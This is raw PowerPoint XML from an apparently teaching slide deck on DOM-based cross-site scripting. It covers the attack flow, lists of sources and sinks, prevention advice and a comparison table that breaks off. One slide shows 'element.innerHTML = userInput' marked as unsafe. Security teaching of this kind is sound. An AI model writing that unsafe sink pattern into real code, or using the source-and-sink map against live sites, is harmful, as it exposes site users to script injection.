          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}"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1" y="1243013"/>
            <a:ext cx="5257800" cy="4933950"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The attack typically follows these steps:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The attacker crafts a malicious URL. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The victim visits the URL. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Client-side JavaScript reads attacker-controlled data. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>JavaScript inserts the data into the DOM. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The browser interprets the inserted content. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The malicious script executes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="en-GB" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="5400" b="1" dirty="0"/>
              <a:t>DOM XSS Attack Flow</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>17</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{256931EC-4181-B301-72C7-6726C9335B39}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7004526" y="1125962"/>
            <a:ext cx="3714273" cy="491595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b="1" dirty="0"/>
              <a:t>Source - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A source is any location from which attacker-controlled input is obtained.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Sink - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A sink is a dangerous JavaScript function or property that processes user input and potentially executes it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="6000" b="1" dirty="0"/>
              <a:t>Sources and Sinks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-GB" sz="6000" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}"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983856-2066-5193-F9DE-A6951928B3A7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1243013"/>
            <a:ext cx="4323079" cy="4933950"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>document.URL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.location</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.location.href</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.location.hash</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.referrer</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>window.name</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>localStorage</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sessionStorage</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C9BE8A06-C856-8550-B397-255DDC168EEA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Common Source and Sink </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>inlcude</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ADA61319-315A-1B32-9409-C5DF0BFA09F9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>19</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Content Placeholder 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B063AEDC-B5D5-7AD5-E025-4599521FC556}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="1243013"/>
            <a:ext cx="4323079" cy="49339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52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innerHTML</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>outerHTML</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.write</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.writeln</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>eval()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>setTimeout</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>setInterval</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>insertAdjacentHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4093186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6D09FB-B8B8-C888-D9B5-3B7D77EB57B5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>textContent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> Instead of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>innerHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>textContent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> treats input as plain text rather than HTML).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Unsafe:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>element.innerHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>userInput</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Safe:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>element.textContent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>userInput</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Sanitize User Input</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Use trusted sanitization libraries before inserting content into the DOM.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Use Secure Frameworks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Modern frameworks such as:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>React </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Angular </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Vue.js </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> As it automatically escape user input in many situations, reducing the likelihood of DOM XSS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CA460040-4FCC-72E8-1AA2-97556C6F2608}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>DOM XSS Prevention</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C2052664-87F9-931B-8A95-42356A49DBD0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>20</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="742130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9299A343-93CA-6573-977B-212F10D1D9BF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph idx="1"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1006774998"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="838200" y="1341120"/>
          <a:ext cx="10632440" cy="4896570"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr>
                <a:tableStyleId>{5DA37D80-6434-44D0-A028-1B22A696006F}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="2658110">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="741384176"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2658110">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3426120373"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2658110">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3683726750"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2658110">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4139891728"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="508549">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
                        <a:t>Feature</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
                        <a:t>Stored XSS</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
                        <a:t>Reflected XSS</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
                        <a:t>DOM XSS</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3951204818"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="508549">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="1"/>
                        <a:t>Payload Stored</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US"/>
                        <a:t>Yes</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US"/>
                        <a:t>No</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US"/>
                        <a:t>No</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2623543160"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="889961">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="1"/>
                        <a:t>Server Involved in Execution</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Yes</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US"/>
                        <a:t>Yes</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US"/>
                        <a:t>Usually No</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2103202078"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="889961">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
                        <a:t>Client-Side JavaScript Required</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US"/>
                        <a:t>Not Necessarily</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US"/>
                        <a:t>Not Necessarily</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US"/>
                        <a:t>Yes</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2112229865"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="508549">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="1"/>
                        <a:t>Persistence</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US"/>
                        <a:t>Persistent</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US"/>
                        <a:t>Non-Persistent</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US"/>
                        <a:t>Non-Persistent</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2511990970"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="508549">
                <a:tc>
                  <a:txBody>
